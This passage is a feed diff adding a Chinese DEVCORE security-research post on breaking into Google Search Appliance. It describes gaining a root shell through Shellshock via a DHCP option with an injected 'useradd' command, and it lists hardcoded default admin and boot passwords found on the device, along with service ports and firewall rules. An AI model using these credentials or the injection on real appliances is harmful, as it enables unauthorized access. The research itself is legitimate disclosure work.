@@ -4,13 +4,1946 @@
  <title>DEVCORE 戴夫寇爾</title>
  <link href="https://devco.re/" rel="self"/>
  <link href="https://devco.re"/>
- <updated>2023-05-26T01:52:26+08:00</updated>
+ <updated>2023-07-07T17:25:22+08:00</updated>
  <id>https://devco.re</id>
  <author>
    <name></name>
    <email></email>
  </author>
 
+ 
+ <entry>
+   <title>[REL] 深入破解 Google Search Appliance</title>
+   <link href="https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/"/>
+   <updated>2023-07-07T00:00:00+08:00</updated>
+   <id>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance</id>
+   <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;懶人包&quot;&gt;懶人包&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;GSA 管理界面認證後任意指令執行&lt;/li&gt;
+  &lt;li&gt;GSA 搜尋介面任意讀檔&lt;/li&gt;
+  &lt;li&gt;GSA 使用 Oracle 的 Outside-in Technology 轉換文件格式&lt;/li&gt;
+  &lt;li&gt;Google 網頁服務有一些固定的URI，會提供此服務的自身資訊&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
+
+&lt;p&gt;Google Search Appliance (以下簡稱 GSA ) 是 Google 於2002 年開始為企業推出的搜尋設備，主要功能為放置於企業內網用於索引內部網路資訊並提供檢索。於 2005 年左右推出給個人及小型企業使用的 Google Mini，於 2008 年底左右有發布虛擬機器版本，名稱為 Virtual Google Search Appliance (以下簡稱 vGSA)，後來於 2018年底結束產品生命週期，產品線整合進入 Cloud Search。&lt;/p&gt;
+
+&lt;h3 id=&quot;設備軟體取得&quot;&gt;設備、軟體取得&lt;/h3&gt;
+
+&lt;p&gt;從 ebay 以關鍵字 Google Search Appliance 搜尋並嘗試購買此設備，
+如果不幸硬碟資料已被清除，也只能嘗試多買幾台了。&lt;/p&gt;
+
+&lt;p&gt;幸運的是，購入的第一台就是未遭完整清除的 GSA：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;現在仍然可以找到正在被販售的設備：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;另一方面 vGSA 原始公開連結已被移除，
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/vgsa/vgsa\_20090210.7z&lt;/code&gt; [已被移除]
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/vgsa/vgsa\_20081028.7z&lt;/code&gt; [已被移除]&lt;/p&gt;
+
+&lt;p&gt;後來用 BitTorrent 磁力連結 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magnet:?xt=urn:btih:89388ACE8C3B91FDD3A2F86D8CBB78C58A70D992&lt;/code&gt; 成功取得檔案。&lt;/p&gt;
+
+&lt;p&gt;接著再從 google groups 中找到舊版軟體連接：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;連結為：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/dl/enterprise/install_bundle-10000622-7.2.0-112.bin&lt;/code&gt; [已被移除]&lt;/p&gt;
+
+&lt;p&gt;由公開網頁中，可取得版本號碼：
+&lt;a href=&quot;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&quot;&gt;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;猜測檔案名稱規則為 install_bundle-10000(三位數字)-7.(一位數字).(數字)-(三位數字).bin&lt;/p&gt;
+
+&lt;p&gt;並編寫 shell script 嘗試下載：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;622&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.2.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
+for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;661&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.4.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
+for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;693&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.6.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;加上網路搜尋到的資料，成功取回以下檔案：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;all_langs-lang-pack-2.1-1.bin
+all_langs-lang-pack-2.2-1.bin
+centos_patch_files-6.0.0-22.bin
+centos_patch_files-6.14.0-28.bin
+centos_patch_files-7.0.14-238.bin
+centos_patch_files-7.2.0-252.bin
+centos_patch_files-7.2.0-264.bin
+centos_patch_files-7.2.0-270.bin
+centos_patch_files-7.2.0-280.bin
+centos_patch_files-7.2.0-286.bin
+install_bundle-10000653-7.2.0-252.bin
+install_bundle-10000658-7.2.0-264.bin
+install_bundle-10000661-7.2.0-270.bin
+install_bundle-10000681-7.4.0-64.bin
+install_bundle-10000685-7.4.0-72.bin
+install_bundle-10000686-7.4.0-74.bin
+install_bundle-10000692-7.4.0-82.bin
+install_bundle-10000762-7.6.0-36.bin
+install_bundle-10000767-7.6.0-42.bin
+install_bundle-10000772-7.6.0-46.bin
+install_bundle-10000781-7.6.0-58.bin
+install_bundle-10000810-7.6.50-30.bin
+install_bundle-10000822-7.6.50-36.bin
+install_bundle-10000855-7.6.50-64.bin
+install_bundle-10000878-7.6.250-12.bin
+install_bundle-10000888-7.6.250-20.bin
+install_bundle-10000901-7.6.250-26.bin
+install_bundle-10000915-7.6.360-10.bin
+install_bundle-10000926-7.6.360-16.bin
+install_bundle-10000967-7.6.512-18.bin
+sw_files-5.0.4-22.bin
+sw_files-6.14.0-28.bin
+sw_files-7.0.14-238.bin
+vm_patch_1_for_504_G22_and_G24_only.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;vgsa-virtual-google-search-appliance&quot;&gt;vGSA (Virtual Google Search Appliance)&lt;/h3&gt;
+
+&lt;p&gt;接著開始 VGSA 的研究，預設情況下完成匯入虛擬機後此系統只提供了一個網路設定的功能，
+沒有提供 shell 可供操作使用。但是由於虛擬機器是執行在自己環境上，
+所以通常可以透過下列方式取得系統權限：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;直接修改未加密的磁碟機檔案&lt;/li&gt;
+  &lt;li&gt;修改虛擬機記憶體內容&lt;/li&gt;
+  &lt;li&gt;使用其他作業系統光碟或磁碟開機&lt;/li&gt;
+  &lt;li&gt;其他已知漏洞&lt;/li&gt;
+  &lt;li&gt;寫死的管理員或系統帳號、密碼&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;下圖為 vGSA 網路設定畫面：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;cve-2014-6271&quot;&gt;CVE-2014-6271&lt;/h4&gt;
+
+&lt;p&gt;當測試早期的 Linux 設備及服務，尤其是使用 RedHat 系列的作業系統時，通常會有 Shellshock 的漏洞，
+而發布日期再2008的 vGSA 也不例外。dhcp server 中插入 option 114 會被設置於環境變數，從而觸發漏洞，執行任意指令：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;指令為：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useradd zzzzgsa&lt;/code&gt;，可以從主控台輸出中看到此指令被重複執行，並產生錯誤訊息。&lt;/p&gt;
+
+&lt;h4 id=&quot;vgsa-觀察&quot;&gt;vGSA 觀察&lt;/h4&gt;
+
+&lt;p&gt;成功取得作業系統權限後，進行網路環境、執行程式、檔案系統的觀察，以下是作業系統環境觀察心得：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;版本號為 5.2.0.G.27。&lt;/li&gt;
+  &lt;li&gt;服務主要由 C/C++、java、python 編寫&lt;/li&gt;
+  &lt;li&gt;/export/hda3 似乎是服務主要使用的目錄&lt;/li&gt;
+  &lt;li&gt;/etc/shadow 存在帳號 root、密碼雜湊為 x███████████M&lt;/li&gt;
+  &lt;li&gt;管理介面 8000、8443 預設管理密碼為 j0njlRXpU5CQ&lt;/li&gt;
+  &lt;li&gt;/.gnupg 存在 ent_box_key 公私鑰。&lt;/li&gt;
+  &lt;li&gt;/.gnupg 存在 google_license_key 公鑰。&lt;/li&gt;
+  &lt;li&gt;/.ssh/authorized_keys 存在兩組公鑰。&lt;/li&gt;
+  &lt;li&gt;/root/.ssh/authorized_keys 存在一組公鑰。&lt;/li&gt;
+  &lt;li&gt;/root/.ssh/ 存在兩組ssh 公私鑰。&lt;/li&gt;
+  &lt;li&gt;/root/.gnupg/ 存在 ent_box_key 公私鑰。&lt;/li&gt;
+  &lt;li&gt;使用 Oracle 公司的 Outside In Technology 將文件轉換為 html網頁。&lt;/li&gt;
+  &lt;li&gt;java 執行環境使用 Security Manager 保護。&lt;/li&gt;
+  &lt;li&gt;請求工程師支援功能使用 ppp 建構虛擬私有網路， /etc/ppp/chap-secrets 存有帳號密碼 ( z██████c、]███████T )&lt;/li&gt;
+  &lt;li&gt;/etc/lilo.conf中的開機選單密碼為 cmBalx7&lt;/li&gt;
+  &lt;li&gt;/export/hda3/versionmanager/google_key.symmetric 有一把疑似為對稱式加密使用的密碼&lt;/li&gt;
+  &lt;li&gt;/export/hda3/versionmanager/vmanager_passwd 存在兩組帳密組合 ( admin： M█████████████████████████w=:9██=  google：w█████████████████████████o=:N██=  )&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;而具有網路服務的執行程式的觀察如下：&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;通訊埠&lt;/th&gt;
+      &lt;th&gt;服務名稱&lt;/th&gt;
+      &lt;th&gt;程式編寫語言&lt;/th&gt;
+      &lt;th&gt;服務說明&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;ssh&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;OpenSSH Server&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;53&lt;/td&gt;
+      &lt;td&gt;named&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;Bind Named&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;953&lt;/td&gt;
+      &lt;td&gt;named&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;Bind Named&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1111&lt;/td&gt;
+      &lt;td&gt;webserver_config&lt;/td&gt;
+      &lt;td&gt;python&lt;/td&gt;
+      &lt;td&gt;Installer&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2100&lt;/td&gt;
+      &lt;td&gt;adminrunner.py&lt;/td&gt;
+      &lt;td&gt;python&lt;/td&gt;
+      &lt;td&gt;enterpriseconsole backend&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;3990&lt;/td&gt;
+      &lt;td&gt;monitor&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;monitor&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4000&lt;/td&gt;
+      &lt;td&gt;rtserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4430&lt;/td&gt;
+      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
+      &lt;td&gt;Java (with security manager)&lt;/td&gt;
+      &lt;td&gt;https 前端&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4911&lt;/td&gt;
+      &lt;td&gt;borgmon&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;borgmon&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4916&lt;/td&gt;
+      &lt;td&gt;reactor&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5000&lt;/td&gt;
+      &lt;td&gt;rtserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5600&lt;/td&gt;
+      &lt;td&gt;rtserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;6600&lt;/td&gt;
+      &lt;td&gt;cacheserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7800&lt;/td&gt;
+      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
+      &lt;td&gt;Java (with security manager)&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7880&lt;/td&gt;
+      &lt;td&gt;TableServer&lt;/td&gt;
+      &lt;td&gt;Java (with security manager)&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7882&lt;/td&gt;
+      &lt;td&gt;AuthzChecker&lt;/td&gt;
+      &lt;td&gt;Java (without security manager)&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7886&lt;/td&gt;
+      &lt;td&gt;tomcat&lt;/td&gt;
+      &lt;td&gt;Java&lt;/td&gt;
+      &lt;td&gt;tomcat server&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8000&lt;/td&gt;
+      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
+      &lt;td&gt;Java (without security manager)&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8443&lt;/td&gt;
+      &lt;td&gt;stunnel&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;redirect http to https&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8888&lt;/td&gt;
+      &lt;td&gt;GWS&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9300&lt;/td&gt;
+      &lt;td&gt;oneboxserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9328&lt;/td&gt;
+      &lt;td&gt;entspellmixer&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9400&lt;/td&gt;
+      &lt;td&gt;mixserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9402&lt;/td&gt;
+      &lt;td&gt;mixserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9448&lt;/td&gt;
+      &lt;td&gt;qrewrite&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9450&lt;/td&gt;
+      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
+      &lt;td&gt;Java (without security manager )&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;10094&lt;/td&gt;
+      &lt;td&gt;enterprise_onebox&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;10200&lt;/td&gt;
+      &lt;td&gt;clustering_server&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;11913&lt;/td&gt;
+      &lt;td&gt;sessionmanager&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;12345&lt;/td&gt;
+      &lt;td&gt;RegistryServer&lt;/td&gt;
+      &lt;td&gt;Java (without security manager)&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;19780&lt;/td&gt;
+      &lt;td&gt;configmgr/ent_configmgr.py&lt;/td&gt;
+      &lt;td&gt;python&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;19900&lt;/td&gt;
+      &lt;td&gt;feedergate&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;21200&lt;/td&gt;
+      &lt;td&gt;FileSystemGateway&lt;/td&gt;
+      &lt;td&gt;Java (with security manager)&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;31300&lt;/td&gt;
+      &lt;td&gt;rtserver&lt;/td&gt;
+      &lt;td&gt;C/C++&lt;/td&gt;
+      &lt;td&gt;未知&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;雖然有這麼多服務，但是 iptables 阻擋了大部分的連線，以下是 iptables 設定：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Redirect privileged ports.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# (we listen as nobody, which can&apos;t attach to low ports, so redirect to high ports)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 7800
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4430
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 444 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4431
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7800 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7801 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4430 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4431 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 19900 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
